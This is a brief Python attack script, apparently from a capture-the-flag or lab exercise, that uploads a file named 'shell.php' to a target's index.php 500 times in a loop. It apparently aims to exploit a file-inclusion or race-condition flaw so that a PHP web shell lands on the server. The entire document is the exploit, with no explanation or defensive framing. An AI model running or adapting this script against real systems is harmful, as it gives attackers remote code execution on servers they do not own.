#!/usr/bin/env python3

import time
import requests

for _ in range(500):
        with open('shell.php', 'rb') as f:
            try:
                r = requests.post('http://mad.hive/index.php?file=index.php', files={'shell.php': f})
            except:
                time.sleep(.01)
